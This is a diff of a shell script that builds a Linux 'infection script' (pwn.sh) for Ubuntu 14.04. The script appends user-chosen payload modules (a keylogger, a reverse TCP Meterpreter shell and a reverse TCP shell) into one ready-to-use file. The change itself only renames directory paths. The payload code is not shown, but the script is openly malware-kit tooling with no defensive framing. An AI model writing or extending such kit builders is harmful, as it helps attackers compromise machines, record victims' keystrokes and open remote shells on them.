@@ -76,21 +76,21 @@ if [ "$msg" != "" ]; then
 fi
 echo $msg
 
-outputscript="kit/pwn.sh";
+outputscript="kitgen/pwn.sh";
 touch $outputscript
 chmod +x $outputscript
-cat kit/kitgen/config_common.sh > $outputscript
+cat kitgen/kitgen/config_common.sh > $outputscript
 
 case $REPLY in
   1 )
     echo "Building script for: $system_option ..."
-    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64.sh >> $outputscript
-    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_start.sh >> $outputscript
-    [[ "${choices[0]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_keylogger.sh >> $outputscript
-    [[ "${choices[1]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp_meterpreter.sh >> $outputscript
-    [[ "${choices[2]}" ]] && cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp.sh >> $outputscript
-    cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_end.sh >> $outputscript
-    kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_build.sh ${payloads[@]} >> $outputscript
+    cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64.sh >> $outputscript
+    cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_start.sh >> $outputscript
+    [[ "${choices[0]}" ]] && cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_keylogger.sh >> $outputscript
+    [[ "${choices[1]}" ]] && cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp_meterpreter.sh >> $outputscript
+    [[ "${choices[2]}" ]] && cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_reverse_tcp.sh >> $outputscript
+    cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_payload_end.sh >> $outputscript
+    kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_build.sh ${payloads[@]} >> $outputscript
     echo "ready to use infection script for $system_option can be found at: $outputscript"
     ;;
 esac
